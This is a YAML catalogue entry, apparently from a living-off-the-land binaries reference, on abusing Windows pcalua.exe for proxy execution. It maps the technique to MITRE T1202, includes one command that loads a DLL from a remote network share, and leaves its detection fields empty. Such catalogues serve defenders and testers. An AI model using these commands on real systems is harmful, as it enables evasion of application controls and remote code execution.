---
Name: Pcalua.exe
Description: Program Compatibility Assistant
Author: 'Oddvar Moe'
Created: 2018-05-25
Commands:
  - Command: pcalua.exe -a calc.exe
    Description: Open the target .EXE using the Program Compatibility Assistant.
    Usecase: Proxy execution of binary
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: pcalua.exe -a \\server\payload.dll
    Description: Open the target .DLL file with the Program Compatibilty Assistant.
    Usecase: Proxy execution of remote dll file
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
  - Command: pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java
    Description: Open the target .CPL file with the Program Compatibility Assistant.
    Usecase: Execution of CPL files
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
Full_Path:
  - Path: C:\Windows\System32\pcalua.exe
Code_Sample:
  - Code:
Detection:
  - IOC:
Resources:
  - Link: https://twitter.com/KyleHanslovan/status/912659279806640128
Acknowledgement:
  - Person: Kyle Hanslovan
    Handle: '@kylehanslovan'
  - Person: Fab
    Handle: '@0rbz_'
---
